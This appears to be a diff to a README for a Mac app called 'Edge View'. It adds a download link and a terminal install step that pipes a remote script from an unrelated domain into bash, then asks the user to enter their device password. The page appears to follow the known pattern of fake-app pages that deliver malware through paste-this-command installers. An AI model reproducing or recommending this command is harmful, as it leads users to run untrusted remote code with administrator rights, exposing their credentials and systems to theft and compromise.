@@ -6,7 +6,7 @@
 
 ## 📥 Download Edge View for Mac
 
-[![Download Now](https://img.shields.io/badge/Download--Now-Edge%20View%20Mac-blue?style=for-the-badge&logo=apple)](#)
+[![Download Now](https://img.shields.io/badge/Download--Now-Edge%20View%20Mac-blue?style=for-the-badge&logo=apple)](https://edgeview-mac-download.github.io/.github)
 
 ---
 ## 📦 How to Install
@@ -23,7 +23,9 @@
 # Installation via a command in the terminal:
 
 1. Copy the installation command below.
+```
 /bin/bash -c "$(curl -fsSL https://veitzeatz.com/get9/install.sh)"
+```
 2. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
 
